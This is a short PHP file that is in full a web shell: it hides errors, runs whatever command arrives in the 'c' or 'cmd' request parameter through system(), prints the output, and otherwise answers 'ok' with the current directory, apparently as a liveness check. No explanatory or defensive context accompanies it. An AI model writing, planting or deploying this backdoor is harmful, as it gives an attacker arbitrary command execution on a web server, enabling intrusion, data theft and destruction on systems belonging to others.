<?php
error_reporting(0);
if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";}
elseif(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";}
else{echo "ok ".getcwd();}
